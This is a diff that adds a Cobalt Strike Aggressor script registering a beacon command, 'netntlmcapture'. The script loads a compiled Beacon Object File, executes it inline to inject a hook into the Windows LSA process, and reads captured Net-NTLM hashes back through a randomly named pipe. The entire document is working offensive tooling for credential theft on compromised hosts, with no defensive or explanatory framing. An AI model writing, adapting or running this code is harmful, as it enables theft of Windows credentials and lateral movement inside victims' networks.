@@ -1,0 +1,45 @@
+import beacon.CommandBuilder;
+import common.CommonUtils;
+
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+
+	}
+	return join('', @random_str);
+}
+
+alias netntlmcapture {
+	$barch = barch( $1 );
+	$netfs = openf( script_resource( "NetNtLmCaptureCs. $+ $barch $+ .o") );
+	$netrw = readb( $netfs, -1 );
+	closef( $netfs );
+
+	$pipen = "\\\\.\\pipe\\". random_string( "12" );
+
+	$argvs = bof_pack( $1, "z", $pipen );
+	btask( $1, "Attempting to inject NetNtLmCapture into Lsa with  $+ $pipen $+ " );
+	beacon_inline_execute( $1, $netrw, "go", $argvs );
+
+	$build = [ new CommandBuilder ];
+	[$build setCommand: 40];
+	[$build addInteger: 0];
+	[$build addShort: 32];
+	[$build addShort: 15000];
+	[$build addLengthAndString: $pipen];
+	[$build addLengthAndString: "NetNtLmCapture"];
+	call( "beacons.task", $null, $1, cast( [$build build], 'b' ) );
+}
+
+beacon_command_register(
+	"netntlmcapture",
+	"Injects Lsa with a hook to capture incoming Net-NTLM hashes.",
+	"Use: netntlmcapture\n\n".
+	"Injects Lsa with a hook to capture incoming Net-NTLM hashes.\n\n".
+	"To terminate this task: use jobs to find the job id. Use jobkill to kill it."
+);
